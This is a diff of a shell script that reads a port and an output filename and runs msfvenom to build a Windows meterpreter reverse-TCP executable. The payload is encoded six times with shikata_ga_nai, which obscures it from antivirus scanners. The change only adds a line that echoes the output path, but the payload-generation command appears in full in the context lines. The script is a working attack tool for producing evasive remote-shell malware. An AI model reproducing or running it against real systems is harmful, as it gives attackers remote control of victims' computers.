@@ -24,3 +24,5 @@ read -p " Port : " port;
 read -p " Output : " out;
 
 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 LHOST=$ip LPORT=$port -f exe > $out
+
+echo -e " Payload : $out"
